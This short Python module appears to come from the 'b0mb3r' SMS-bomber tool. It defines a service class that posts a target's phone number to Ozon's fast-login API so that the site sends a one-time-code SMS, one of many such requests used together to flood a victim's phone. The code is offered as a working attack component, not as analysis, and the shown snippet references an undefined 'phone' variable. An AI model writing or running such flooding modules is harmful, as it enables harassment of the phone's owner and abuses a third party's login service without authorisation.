from b0mb3r.services.service import Service


class Ozon(Service):
    async def run(self):
        await self.post(
            "https://www.ozon.ru/api/composer-api.bx/_action/fastEntry",
            json={"phone": phone, "otpId": 0},
        )
